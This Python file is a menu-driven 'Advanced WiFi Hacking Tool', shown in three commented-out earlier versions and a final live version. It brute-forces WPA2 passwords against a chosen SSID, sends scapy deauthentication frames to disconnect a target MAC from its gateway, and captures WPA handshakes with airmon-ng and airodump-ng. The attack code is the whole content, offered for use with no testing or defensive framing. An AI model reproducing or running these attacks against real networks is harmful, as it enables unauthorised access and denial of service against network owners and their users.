# import pywifi
# import itertools
# import multiprocessing
# import time
# import os
# import sys
# import logging
# from scapy.all import *

# logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# def generate_passwords():
#     chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+'
#     return (''.join(candidate) for candidate in itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(8, 20)))

# def try_password(ssid, password):
#     wifi = pywifi.PyWiFi()
#     iface = wifi.interfaces()[0]
#     profile = pywifi.Profile()
#     profile.ssid = ssid
#     profile.auth = pywifi.const.AUTH_ALG_OPEN
#     profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
#     profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
#     profile.key = password
#     iface.remove_all_network_profiles()
#     tmp_profile = iface.add_network_profile(profile)
#     iface.connect(tmp_profile)
#     time.sleep(0.5)
#     if iface.status() == pywifi.const.IFACE_CONNECTED:
#         return password
#     else:
#         return None

# def crack_wifi(ssid):
#     pool = multiprocessing.Pool(processes=multiprocessing.cpu_count())
#     passwords = generate_passwords()
#     results = pool.starmap(try_password, [(ssid, password) for password in passwords])
#     pool.close()
#     pool.join()
#     return next((result for result in results if result is not None), None)

# def deauth_attack(target_mac, gateway_mac, iface):
#     print(f"Launching deauthentication attack on {target_mac}")
#     packet = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
#     sendp(packet, iface=iface, count=100, inter=0.1, verbose=False)

# def scan_networks():
#     wifi = pywifi.PyWiFi()
#     iface = wifi.interfaces()[0]
#     iface.scan()
#     time.sleep(2)
#     results = iface.scan_results()
#     return [(result.ssid, result.bssid) for result in results]

# def capture_handshake(ssid, channel):
#     print(f"Attempting to capture WPA handshake for {ssid}")
#     os.system(f"airmon-ng start wlan0")
#     os.system(f"airodump-ng -c {channel} --bssid {ssid} -w capture wlan0mon")
#     # This would run for a set time, then we'd check for a captured handshake

# if __name__ == '__main__':
#     print("Advanced WiFi Hacking Tool")
#     print("1. Brute Force Attack")
#     print("2. Deauthentication Attack")
#     print("3. Scan Networks")
#     print("4. Capture WPA Handshake")
    
#     choice = input("Select an option: ")
    
#     if choice == '1':
#         target_ssid = input("Enter the target WiFi SSID: ")
#         print(f"Attempting to crack password for {target_ssid}...")
#         password = crack_wifi(target_ssid)
#         if password:
#             print(f"Success! The password is: {password}")
#         else:
#             print("Password not found. Try expanding the character set or increasing the password length range.")
    
#     elif choice == '2':
#         target_mac = input("Enter target MAC address: ")
#         gateway_mac = input("Enter gateway MAC address: ")
#         iface = input("Enter network interface (e.g., wlan0): ")
#         deauth_attack(target_mac, gateway_mac, iface)
    
#     elif choice == '3':
#         networks = scan_networks()
#         for i, (ssid, bssid) in enumerate(networks, 1):
#             print(f"{i}. SSID: {ssid}, BSSID: {bssid}")
    
#     elif choice == '4':
#         ssid = input("Enter target SSID: ")
#         channel = input("Enter WiFi channel: ")
#         capture_handshake(ssid, channel)
    
#     else:
#         print("Invalid choice. Exiting.")

# print("Happy hacking! Remember, with great power comes great responsibility.")

# V1 - WORKING VERSION WITH NO AUTO SELECT
# import itertools
# import multiprocessing
# import time
# import os
# import sys
# import logging
# from scapy.all import *

# logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# def generate_passwords():
#     chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+'
#     return (''.join(candidate) for candidate in itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(8, 20)))

# def try_password(ssid, password):
#     wifi = pywifi.PyWiFi()
#     iface = wifi.interfaces()[0]
#     profile = pywifi.Profile()
#     profile.ssid = ssid
#     profile.auth = pywifi.const.AUTH_ALG_OPEN
#     profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
#     profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
#     profile.key = password
#     iface.remove_all_network_profiles()
#     tmp_profile = iface.add_network_profile(profile)
#     iface.connect(tmp_profile)
#     time.sleep(0.5)
#     if iface.status() == pywifi.const.IFACE_CONNECTED:
#         return password
#     else:
#         return None

# def crack_wifi(ssid):
#     pool = multiprocessing.Pool(processes=multiprocessing.cpu_count())
#     passwords = generate_passwords()
#     results = pool.starmap(try_password, [(ssid, password) for password in passwords])
#     pool.close()
#     pool.join()
#     return next((result for result in results if result is not None), None)

# def deauth_attack(target_mac, gateway_mac, iface):
#     print(f"Launching deauthentication attack on {target_mac}")
#     packet = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
#     sendp(packet, iface=iface, count=100, inter=0.1, verbose=False)

# def scan_networks():
#     os.system("sudo iwlist wlan0 scan > scan_results.txt")
#     with open("scan_results.txt", "r") as file:
#         results = file.read()
#     # Parse the results to extract SSID and BSSID
#     networks = []
#     for line in results.splitlines():
#         if "Cell" in line:
#             networks.append({"ssid": "", "bssid": ""})
#         elif "ESSID:" in line:
#             networks[-1]["ssid"] = line.split('"')[1]
#         elif "Address:" in line:
#             networks[-1]["bssid"] = line.split("Address: ")[1]
#     return [(network["ssid"], network["bssid"]) for network in networks if network["ssid"]]

# def capture_handshake(ssid, channel, iface):
#     print(f"Attempting to capture WPA handshake for {ssid}")
#     os.system(f"sudo airmon-ng start {iface}")
#     os.system(f"sudo airodump-ng -c {channel} --bssid {ssid} -w capture {iface}mon")
#     # This would run for a set time, then we'd check for a captured handshake

# if __name__ == '__main__':
#     print("Advanced WiFi Hacking Tool")
#     print("1. Brute Force Attack")
#     print("2. Deauthentication Attack")
#     print("3. Scan Networks")
#     print("4. Capture WPA Handshake")

#     choice = input("Select an option: ")

#     if choice == '1':
#         target_ssid = input("Enter the target WiFi SSID: ")
#         print(f"Attempting to crack password for {target_ssid}...")
#         password = crack_wifi(target_ssid)
#         if password:
#             print(f"Success! The password is: {password}")
#         else:
#             print("Password not found. Try expanding the character set or increasing the password length range.")

#     elif choice == '2':
#         target_mac = input("Enter target MAC address: ")
#         gateway_mac = input("Enter gateway MAC address: ")
#         iface = input("Enter network interface (e.g., wlan0): ")
#         deauth_attack(target_mac, gateway_mac, iface)

#     elif choice == '3':
#         networks = scan_networks()
#         for i, (ssid, bssid) in enumerate(networks, 1):
#             print(f"{i}. SSID: {ssid}, BSSID: {bssid}")

#     elif choice == '4':
#         ssid = input("Enter target SSID: ")
#         channel = input("Enter WiFi channel: ")
#         iface = input("Enter network interface (e.g., wlan0): ")
#         capture_handshake(ssid, channel, iface)

#     else:
#         print("Invalid choice. Exiting.")

# print("Happy hacking! Remember, with great power comes great responsibility.")


# import itertools
# import multiprocessing
# import time
# import os
# import sys
# import logging
# from scapy.all import *

# logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# def generate_passwords():
#     chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+'
#     return (''.join(candidate) for candidate in itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(8, 20)))


# def try_password(ssid, password):
#     wifi = pywifi.PyWiFi()
#     iface = wifi.interfaces()[0]
#     profile = pywifi.Profile()
#     profile.ssid = ssid
#     profile.auth = pywifi.const.AUTH_ALG_OPEN
#     profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
#     profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
#     profile.key = password
#     iface.remove_all_network_profiles()
#     tmp_profile = iface.add_network_profile(profile)
#     iface.connect(tmp_profile)
#     time.sleep(0.5)
#     if iface.status() == pywifi.const.IFACE_CONNECTED:
#         return password
#     else:
#         return None
# def try_password(ssid, password):
#     # Placeholder function for trying a password
#     # You would need to implement the actual connection logic here
#     return None

# def crack_wifi(ssid):
#     pool = multiprocessing.Pool(processes=multiprocessing.cpu_count())
#     passwords = generate_passwords()
#     results = pool.starmap(try_password, [(ssid, password) for password in passwords])
#     pool.close()
#     pool.join()
#     return next((result for result in results if result is not None), None)

# def deauth_attack(target_mac, gateway_mac, iface):
#     print(f"Launching deauthentication attack on {target_mac}")
#     packet = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
#     sendp(packet, iface=iface, count=100, inter=0.1, verbose=False)

# def scan_networks():
#     os.system("sudo iwlist wlan0 scan > scan_results.txt")
#     with open("scan_results.txt", "r") as file:
#         results = file.read()
#     # Parse the results to extract SSID and BSSID
#     networks = []
#     for line in results.splitlines():
#         if "Cell" in line:
#             networks.append({"ssid": "", "bssid": ""})
#         elif "ESSID:" in line:
#             networks[-1]["ssid"] = line.split('"')[1]
#         elif "Address:" in line:
#             networks[-1]["bssid"] = line.split("Address: ")[1]
#     return [(network["ssid"], network["bssid"]) for network in networks if network["ssid"]]

# def capture_handshake(ssid, channel, iface):
#     print(f"Attempting to capture WPA handshake for {ssid}")
#     os.system(f"sudo airmon-ng start {iface}")
#     os.system(f"sudo airodump-ng -c {channel} --bssid {ssid} -w capture {iface}mon")
#     # This would run for a set time, then we'd check for a captured handshake

# if __name__ == '__main__':
#     print("Advanced WiFi Hacking Tool")
#     print("1. Brute Force Attack")
#     print("2. Deauthentication Attack")
#     print("3. Scan Networks")
#     print("4. Capture WPA Handshake")

#     choice = input("Select an option: ")

#     if choice == '1':
#         networks = scan_networks()
#         for i, (ssid, bssid) in enumerate(networks, 1):
#             print(f"{i}. SSID: {ssid}, BSSID: {bssid}")
#         target_index = int(input("Enter the number of the target WiFi network: ")) - 1
#         target_ssid = networks[target_index][0]
#         print(f"Attempting to crack password for {target_ssid}...")
#         password = crack_wifi(target_ssid)
#         if password:
#             print(f"Success! The password is: {password}")
#         else:
#             print("Password not found. Try expanding the character set or increasing the password length range.")

#     elif choice == '2':
#         target_mac = input("Enter target MAC address: ")
#         gateway_mac = input("Enter gateway MAC address: ")
#         iface = input("Enter network interface (e.g., wlan0): ")
#         deauth_attack(target_mac, gateway_mac, iface)

#     elif choice == '3':
#         networks = scan_networks()
#         for i, (ssid, bssid) in enumerate(networks, 1):
#             print(f"{i}. SSID: {ssid}, BSSID: {bssid}")

#     elif choice == '4':
#         networks = scan_networks()
#         for i, (ssid, bssid) in enumerate(networks, 1):
#             print(f"{i}. SSID: {ssid}, BSSID: {bssid}")
#         target_index = int(input("Enter the number of the target WiFi network: ")) - 1
#         target_ssid = networks[target_index][0]
#         channel = input("Enter WiFi channel: ")
#         iface = input("Enter network interface (e.g., wlan0): ")
#         capture_handshake(target_ssid, channel, iface)

#     else:
#         print("Invalid choice. Exiting.")

# print("Happy hacking! Remember, with great power comes great responsibility.")

import itertools
import multiprocessing
import time
import os
import sys
import logging
from scapy.all import *
import pywifi

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def generate_passwords(min_len=8, max_len=20, chars=None):
    if chars is None:
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+'
    return (''.join(candidate) for candidate in itertools.chain.from_iterable(
        itertools.product(chars, repeat=i) for i in range(min_len, max_len + 1)))

def try_password(ssid, password):
    try:
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = pywifi.const.AUTH_ALG_OPEN
        profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
        profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
        profile.key = password
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        iface.connect(tmp_profile)
        time.sleep(0.5)
        if iface.status() == pywifi.const.IFACE_CONNECTED:
            return password
    except Exception as e:
        logging.error(f"Error trying password {password}: {e}")
    return None

def crack_wifi(ssid, min_len=8, max_len=20, chars=None):
    pool = multiprocessing.Pool(processes=multiprocessing.cpu_count())
    passwords = generate_passwords(min_len, max_len, chars)
    results = pool.starmap(try_password, [(ssid, password) for password in passwords])
    pool.close()
    pool.join()
    return next((result for result in results if result is not None), None)

def deauth_attack(target_mac, gateway_mac, iface):
    try:
        logging.info(f"Launching deauthentication attack on {target_mac}")
        packet = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
        sendp(packet, iface=iface, count=100, inter=0.1, verbose=False)
    except Exception as e:
        logging.error(f"Error during deauth attack: {e}")

def scan_networks():
    try:
        os.system("sudo iwlist wlan0 scan > scan_results.txt")
        networks = []
        with open("scan_results.txt", "r") as file:
            results = file.read()
        for line in results.splitlines():
            if "Cell" in line:
                networks.append({"ssid": "", "bssid": ""})
            elif "ESSID:" in line:
                networks[-1]["ssid"] = line.split('"')[1]
            elif "Address:" in line:
                networks[-1]["bssid"] = line.split("Address: ")[1]
        return [(network["ssid"], network["bssid"]) for network in networks if network["ssid"]]
    except Exception as e:
        logging.error(f"Error scanning networks: {e}")
        return []

def capture_handshake(ssid, channel, iface, duration=60, output_file="capture"):
    try:
        logging.info(f"Attempting to capture WPA handshake for {ssid}")
        os.system(f"sudo airmon-ng start {iface}")
        os.system(f"sudo airodump-ng -c {channel} --bssid {ssid} -w {output_file} {iface}mon --write-interval {duration}")
    except Exception as e:
        logging.error(f"Error capturing handshake: {e}")

if __name__ == '__main__':
    print("Advanced WiFi Hacking Tool")
    print("1. Brute Force Attack")
    print("2. Deauthentication Attack")
    print("3. Scan Networks")
    print("4. Capture WPA Handshake")

    choice = input("Select an option: ")

    if choice == '1':
        networks = scan_networks()
        for i, (ssid, bssid) in enumerate(networks, 1):
            print(f"{i}. SSID: {ssid}, BSSID: {bssid}")
        target_index = int(input("Enter the number of the target WiFi network: ")) - 1
        target_ssid = networks[target_index][0]
        min_len = int(input("Enter minimum password length (default 8): ") or "8")
        max_len = int(input("Enter maximum password length (default 20): ") or "20")
        chars = input("Enter custom characters (default: a-zA-Z0-9!@#$%^&*()_+): ") or None
        print(f"Attempting to crack password for {target_ssid}...")
        password = crack_wifi(target_ssid, min_len, max_len, chars)
        if password:
            print(f"Success! The password is: {password}")
        else:
            print("Password not found. Try expanding the character set or increasing the password length range.")

    elif choice == '2':
        target_mac = input("Enter target MAC address: ")
        gateway_mac = input("Enter gateway MAC address: ")
        iface = input("Enter network interface (e.g., wlan0): ")
        deauth_attack(target_mac, gateway_mac, iface)

    elif choice == '3':
        networks = scan_networks()
        for i, (ssid, bssid) in enumerate(networks, 1):
            print(f"{i}. SSID: {ssid}, BSSID: {bssid}")

    elif choice == '4':
        networks = scan_networks()
        for i, (ssid, bssid) in enumerate(networks, 1):
            print(f"{i}. SSID: {ssid}, BSSID: {bssid}")
        target_index = int(input("Enter the number of the target WiFi network: ")) - 1
        target_ssid = networks[target_index][0]
        channel = input("Enter WiFi channel: ")
        iface = input("Enter network interface (e.g., wlan0): ")
        duration = int(input("Enter duration for capturing (seconds, default 60): ") or "60")
        output_file = input("Enter output file name (default capture): ") or "capture"
        capture_handshake(target_ssid, channel, iface, duration, output_file)

    else:
        print("Invalid choice. Exiting.")

    print("Happy hacking! Remember, with great power comes great responsibility.")
